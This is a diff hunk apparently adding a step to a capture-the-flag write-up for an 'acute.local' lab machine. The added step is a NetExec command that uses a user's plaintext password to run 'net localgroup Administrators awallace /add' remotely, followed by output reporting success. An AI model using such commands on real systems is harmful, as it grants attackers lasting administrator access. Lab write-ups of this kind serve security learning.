@@ -675,6 +675,18 @@ Ill make a batch script to add the current user to the site_admin group
 
 This group is a member of the administrators group
 
+After a few minutes i try auth with nxc on the user `awallace` i this user is now an admin
+
+But this is soon reset, so ill run a command to make it more permanant
+
+```python
+❯❯❯ nxc smb atsserver.acute.local -u awallace -p 'Password@123' -k -X 'net localgroup Administrators awallace /add'
+SMB         atsserver.acute.local 445    atsserver        [*]  x64 (name:atsserver) (domain:acute.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         atsserver.acute.local 445    atsserver        [+] acute.local\awallace:Password@123 (Pwn3d!)
+SMB         atsserver.acute.local 445    atsserver        [+] Executed command via wmiexec
+SMB         atsserver.acute.local 445    atsserver        The command completed successfully.
+```
+
 
 
 
